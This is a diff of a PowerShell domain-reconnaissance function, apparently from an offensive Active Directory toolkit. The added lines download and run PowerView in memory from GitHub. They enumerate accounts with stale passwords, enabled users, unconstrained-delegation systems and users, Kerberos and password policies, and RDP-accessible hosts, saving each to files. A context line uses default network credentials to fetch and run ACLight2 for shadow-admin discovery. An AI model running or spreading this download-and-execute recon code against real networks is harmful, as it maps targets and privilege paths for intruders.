@@ -343,7 +343,23 @@ function domainreconmodules
             Get-NetForestTrust >> $currentPath\DomainRecon\ForestTrust.txt
             Find-ForeignUser >> $currentPath\DomainRecon\ForeignUser.txt
             Find-ForeignGroup >> $currentPath\DomainRecon\ForeignGroup.txt
-
+	    
+	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
+	    $Date = (Get-Date).AddYears(-1).ToFileTime()
+            Get-DomainUser -LDAPFilter "(pwdlastset<=$Date)" -Properties samaccountname,pwdlastset >> $currentPath\DomainRecon\Users_Nochangedpassword.txt
+	    
+	    Get-DomainUser -LDAPFilter "(!userAccountControl:1.2.840.113556.1.4.803:=2)" -Properties distinguishedname
+            Get-DomainUser -UACFilter NOT_ACCOUNTDISABLE -Properties distinguishedname >> $currentPath\DomainRecon\Enabled_Users.txt
+	    
+	    $Computers = Get-DomainComputer -Unconstrained >> $currentPath\DomainRecon\Unconstrained_Systems.txt
+            $Users = Get-DomainUser -AllowDelegation -AdminCount >> $currentPath\DomainRecon\UnconstrainedDelegationUsers.txt
+	    
+	    $DomainPolicy = Get-DomainPolicy -Policy Domain
+            $DomainPolicy.KerberosPolicy >> $currentPath\DomainRecon\Kerberospolicy.txt
+            $DomainPolicy.SystemAccess >> $currentPath\DomainRecon\Passwordpolicy.txt
+	    
+	    Get-DomainGPOUserLocalGroupMapping -Identity $env:UserName -LocalGroup RDP >> $currentPath\DomainRecon\RDPAccess_Systems.txt 
+	    
             Write-Host -ForegroundColor Yellow 'Starting ACLAnalysis for Shadow Admin detection:'
             invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/ACLight/master/ACLight2/ACLight2.ps1'');Start-ACLsAnalysis;Write-Host -ForegroundColor Yellow ''Moving Files:'';mv C:\Results\ .\DomainRecon\;}'
 
